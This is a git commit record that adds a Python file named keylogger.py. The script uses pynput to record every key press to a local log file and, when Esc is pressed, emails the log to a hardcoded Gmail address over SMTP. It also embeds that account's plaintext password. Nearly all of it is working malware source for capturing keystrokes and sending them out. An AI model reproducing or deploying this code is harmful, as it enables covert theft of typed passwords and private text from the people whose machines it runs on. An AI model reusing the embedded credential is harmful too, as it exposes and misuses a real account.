913929707251313093a690fe714de5e5eea5dd50
Shawn Sudaria <shawnlovecode14@gmail.com>
2022-04-28 14:37:52 +0800

    Added new files

---
+++ keylogger.py
@@ -0,0 +1,36 @@
+from time import sleep
+from pynput import keyboard
+import smtplib
+def sendTo_Email():
+    EMAIL = "shawnmichaelsudaria14@gmail.com"
+    PASS = "Networkdown14"
+    with open("log.txt", "r") as log:
+        message = log.read()
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(EMAIL, PASS)
+        server.sendmail(EMAIL, EMAIL, message)
+        server.quit()
+
+
+
+def on_press(key):
+    with open("log.txt", "a") as f:
+        try:
+            f.write(key.char)
+            
+        except AttributeError:
+            f.write(" ")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        sendTo_Email()
+        sleep(2)
+        # Stop listener
+        return False
+
+# Collect events until released
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
